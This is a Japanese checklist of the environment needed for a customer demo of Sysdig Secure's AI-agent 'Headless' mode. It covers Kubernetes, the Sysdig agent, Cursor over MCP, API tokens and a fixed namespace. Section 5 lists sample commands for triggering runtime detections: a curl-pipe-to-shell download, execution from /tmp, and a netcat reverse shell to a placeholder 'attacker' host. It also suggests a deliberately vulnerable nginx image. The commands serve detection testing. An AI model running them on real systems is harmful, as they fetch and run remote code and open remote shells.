# Headless Sysdig デモに必要な環境一覧

顧客向けデモを安定して実施するなら、最低限これを揃えるとかなり安全です。

---

## 1. 必須アカウント

### ① Sysdig Secure テナント

最重要です。

必要機能:
- CSPM
- Vulnerability Management
- Runtime Security
- Inventory
- SysQL

#### 推奨状態

| 項目 | 推奨 |
|------|------|
| Runtime Eventあり | 必須 |
| Kubernetes接続済み | 必須 |
| Vulnerability検出済み | 必須 |
| Cloud接続済み | あると強い |
| Runtime Policies有効 | 推奨 |

---

## 2. Kubernetes環境

### 推奨

#### 一番ラク
- kind
- minikube

#### 顧客向けなら強い
- EKS

理由:
- 現実感がある
- Runtime説明しやすい
- Cloud Context出せる

---

## 3. Sysdig Agent

### 必須

Host Shield / Agent — Runtimeを出すため。

### 必要なもの
- Falco Event
- Process情報
- Container Metadata
- Kubernetes Metadata

---

## 4. 脆弱コンテナ

### 必須

Headlessの価値は:
- Runtime
- Vulnerability
- Context Correlation

なので、脆弱イメージが必要。

### 超おすすめ

```yaml
nginx:1.16
```

または `vulhub` 系。

---

## 5. Runtime Event生成環境

### 超重要

これが無いと Sysdig の差別化が死にます。

### 推奨イベント

#### curl | bash

```bash
curl http://test/payload.sh | sh
```

#### tmp execution

```bash
chmod +x /tmp/test.sh
/tmp/test.sh
```

#### nc reverse shell

```bash
nc -e /bin/sh attacker 4444
```

---

## 6. AI Agent

ここが Headless の主役。

### 一番おすすめ

#### Cursor

理由:
- 見栄えが良い
- 顧客受けが良い
- AI感が強い
- 日本企業でもわかりやすい

### 他候補

| 製品 | 備考 |
|------|------|
| Claude Code | 強い |
| VSCode Agent | 安定 |
| OpenAI Codex系 | 技術者向け |
| CLI Agent | 玄人向け |

---

## 7. MCP 接続

これが Headless のコア。

### 必要

- MCP Endpoint
- API Token
- Sysdig Skills

### 実際には

Headless Preview環境のセットアップが必要。

---

## 8. API Token

### 必須

最低: Read権限

### 推奨

- Runtime
- Inventory
- Vulnerability
- Posture

全部。

---

## 9. デモ用 Namespace

### 必須

固定する。

### 推奨

- `production`
- `payments`
- `demo`

---

## 10. 事前生成データ

### 超重要

#### 必須

- **Vulnerability**: 事前スキャン済み
- **Runtime Event**: 最低3〜5件
- **Inventory**: Pod/Workloadが見えている

---

## 11. ネットワーク

意外と事故る。

### 必須

| 項目 | 内容 |
|------|------|
| Internet | 必須 |
| Cursor login | 必須 |
| Sysdig SaaS | 必須 |
| MCP endpoint | 必須 |

---

## 12. デモマシン

### 推奨

Mac。

理由:
- Cursor安定
- Terminal映え
- Kubernetesやりやすい

---

## 13. 推奨構成 (現実解)

### 最強に安定

| 要素 | 推奨 |
|------|------|
| Cloud | AWS |
| K8s | EKS |
| Runtime | Sysdig Agent |
| AI | Cursor |
| Demo | 事前仕込み |
| UI | 最小限 |
| Namespace | fixed |
| Runtime Event | pre-generated |

---

## 14. あると超強いもの

### CloudTrail連携

AIが:
- IAM
- Role
- Exposure

まで見れる。

### CI/CD

GitHub Actions。すると「PR remediation」まで見せられる。

---

## 15. 最小構成 (まず動かすだけ)

### 最低限これ

| 必要 | 内容 |
|------|------|
| Sysdig Secure | 1 |
| Kubernetes | 1 |
| Agent | 1 |
| Vulnerable container | 1 |
| Runtime Event | 1 |
| Cursor | 1 |
| API Token | 1 |

これだけでデモは成立します。

---

## 16. まず最初にやるべき順番

| Step | 内容 |
|------|------|
| Step 1 | Sysdig Secure テナント確認 |
| Step 2 | Kubernetes接続 |
| Step 3 | Runtime Event発生確認 |
| Step 4 | 脆弱性表示確認 |
| Step 5 | Cursor + MCP接続 |
| Step 6 | AI Query 動作確認 |

---

## 17. 一番重要

> **デモは「リアルタイム」より「再現性」です。**

だから:
- Event事前生成
- Namespace固定
- Query固定
- 結果確認済み

にしてください。これで成功率が激増します。
